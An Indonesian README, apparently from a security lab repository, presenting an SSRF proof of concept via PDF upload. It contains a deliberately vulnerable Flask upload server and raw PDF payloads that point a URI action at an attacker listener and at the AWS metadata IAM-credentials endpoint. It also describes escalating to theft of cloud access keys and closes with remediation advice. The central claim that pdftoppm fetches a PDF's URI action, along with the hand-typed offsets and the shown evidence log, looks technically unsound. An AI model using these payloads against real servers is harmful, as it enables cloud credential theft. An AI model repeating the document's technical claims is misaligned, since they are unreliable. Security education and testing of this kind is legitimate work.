# Server-Side Request Forgery (SSRF) via PDF File Upload

Repositori ini berisi dokumentasi dan *Proof of Concept* (PoC) untuk kerentanan **Server-Side Request Forgery (SSRF)** yang dieksploitasi melalui fitur unggah file (File Upload) berformat `.pdf`.

Format PDF memiliki fitur bawaan untuk memuat sumber daya eksternal (gambar, tautan, atau font) melalui URL. Jika *library* di sisi server (seperti `Poppler`, `Ghostscript`, atau `ImageMagick`) memproses file PDF tanpa memblokir akses ke jaringan internal, penyerang dapat memaksa server untuk melakukan *request* ke alamat yang dikendalikan penyerang atau ke IP internal yang sensitif.

## 📌 Informasi Kerentanan
*   **Tipe Kerentanan:** Server-Side Request Forgery (SSRF)
*   **Vektor Serangan:** File Upload (`.pdf`)
*   **Dampak:** Memindai jaringan internal (Port Scanning), mengakses layanan internal, hingga pencurian kredensial Cloud (AWS/GCP Metadata).

---

## 🛠️ Persiapan Environment Lab

Pengujian dilakukan pada lingkungan lokal menggunakan WSL (Windows Subsystem for Linux) dengan IP `172.23.193.238` (sesuaikan dengan IP Anda).

### 1. Server Lab Rentan (Python Flask + Poppler)
Kita membuat server sederhana yang menerima file PDF dan memprosesnya untuk membuat *thumbnail* menggunakan *library* `pdftoppm` (bagian dari `poppler-utils`).

```bash
# Instalasi dependensi di WSL
sudo apt update
sudo apt install python3-pip poppler-utils -y
pip3 install flask
```

Buat file `server_ssrf.py`:
```python
from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

HTML = """
<!doctype html>
<title>PDF Preview Lab</title>
<h1>Upload PDF (Vulnerable SSRF)</h1>
<form method=post enctype=multipart/form-data>
  <input type=file name=file>
  <input type=submit value=Upload>
</form>
<p>Status: {{ result }}</p>
"""

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            return 'No file part'
        file = request.files['file']
        if file.filename == '':
            return 'No selected file'
        
        filepath = "/tmp/test.pdf"
        file.save(filepath)
        
        try:
            # Menjalankan pdftoppm untuk merender PDF menjadi gambar
            # Jika PDF berisi URL eksternal, Poppler akan mencoba mengambilnya
            result = subprocess.run(['pdftoppm', '-png', '-f', '1', '-l', '1', filepath, '/tmp/out'], 
                                    capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                return render_template_string(HTML, result="PDF berhasil diproses dan dirender.")
            else:
                return render_template_string(HTML, result=f"Error: {result.stderr}")
        except subprocess.TimeoutExpired:
             return render_template_string(HTML, result="Error: Server timeout (kemungkinan SSRF sedang menunggu respons).")
        except Exception as e:
            return render_template_string(HTML, result=f"Exception: {str(e)}")
            
    return render_template_string(HTML, result="Belum ada file.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```

### 2. HTTP Listener (Attacker Server)
Jalankan server HTTP untuk menangkap *callback* dari server lab. Ini mensimulasikan server milik penyerang.

```bash
# Buka terminal baru
python3 -m http.server 8080
```

---

## 🚀 Membuat Payload PDF (SSRF)

PDF dibuat secara manual (raw) untuk menyisipkan objek `/URI` yang akan memicu *request* HTTP. Kita akan membuat dua variasi payload: satu untuk menembak ke server penyerang, dan satu untuk menembak ke Cloud Metadata (AWS).

### A. Payload SSRF ke Server Penyerang
Ganti IP `172.23.193.238` dengan IP WSL/Server Listener Anda.

```bash
cat > ssrf_attacker.pdf <<'EOF'
%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>
endobj
4 0 obj
<< /Type /Action /S /URI /URI (http://172.23.193.238:8080/ssrf-trigger) >>
endobj
5 0 obj
<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A 4 0 R >>
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000125 00000 n 
0000000219 00000 n 
0000000314 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
410
%%EOF
EOF
```

### B. Payload SSRF ke AWS Metadata (Cloud)
Jika target di-hosting di AWS EC2, kita bisa mengubah URL menjadi IP Metadata internal AWS.

```bash
cat > ssrf_aws.pdf <<'EOF'
%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>
endobj
4 0 obj
<< /Type /Action /S /URI /URI (http://169.254.169.254/latest/meta-data/iam/security-credentials/) >>
endobj
5 0 obj
<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] /A 4 0 R >>
endobj
xref
0 6
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000125 00000 n 
0000000219 00000 n 
0000000314 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
410
%%EOF
EOF
```

---

## 🎯 Eksekusi & Hasil (Proof of Concept)

1.  Jalankan Server Lab (Terminal 1): `python3 server_ssrf.py`
2.  Jalankan Listener (Terminal 2): `python3 -m http.server 8080`
3.  Buka browser ke `http://localhost:5000`.
4.  Unggah file `ssrf_attacker.pdf`.
5.  Perhatikan Terminal 2 (Listener 8080).

**Evidence:**
Jika server lab rentan, Anda akan melihat request HTTP masuk dari server lab ke listener Anda.
```text
172.23.193.238 - - [17/Nov/2026 11:15:00] "GET /ssrf-trigger HTTP/1.1" 200 -
```
Ini membuktikan server telah dipaksa untuk melakukan *request* ke URL yang dikendalikan oleh penyerang.

---

## ☁️ Skenario Eskalasi: SSRF ke Cloud Metadata (AWS)

Jika aplikasi target berjalan di infrastruktur Cloud (AWS, GCP, Azure), penyerang dapat mengganti URL di dalam PDF menjadi IP khusus `169.254.169.254`.

1.  Server aplikasi memproses PDF.
2.  Server aplikasi melakukan *request* ke `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
3.  Server AWS merespons dengan nama Role IAM.
4.  Penyerang kemudian memaksa server untuk mengambil kredensial di URL berikutnya (misal: `http://169.254.169.254/latest/meta-data/iam/security-credentials/Nama-Role`).
5.  Penyerang mendapatkan `AccessKeyId`, `SecretAccessKey`, dan `Token` milik server tersebut.

**Catatan:** AWS modern menggunakan IMDSv2 yang membutuhkan *Header* `X-aws-ec2-metadata-token`. SSRF via PDF biasa (GET request tanpa header khusus) hanya akan berhasil jika server target masih menggunakan IMDSv1.

---

## 🛡️ Rekomendasi Perbaikan (Remediation)

1.  **Gunakan Versi Terbaru:** Pastikan *library* pemroses PDF (seperti `Poppler`, `Ghostscript`, `ImageMagick`) selalu diperbarui ke versi terbaru yang sudah memblokir referensi jaringan eksternal secara *default*.
2.  **Konfigurasi Blokir:** Konfigurasi *library* PDF untuk menonaktifkan fitur pengambilan resource eksternal (contoh pada Poppler: gunakan *flag* untuk memblokir URI).
3.  **Network Isolation:** Jalankan proses rendering PDF di dalam *sandbox* atau *container* yang terisolasi yang tidak memiliki akses ke jaringan internal (terutama ke IP Metadata `169.254.169.254`).
4.  **Firewall Egress:** Blokir lalu lintas keluar (egress) dari server aplikasi ke IP Metadata Cloud dan ke jaringan internal yang tidak diperlukan.

---
*Dokumentasi ini dibuat untuk tujuan edukasi dan pengujian keamanan di lingkungan lab yang terisolasi.*
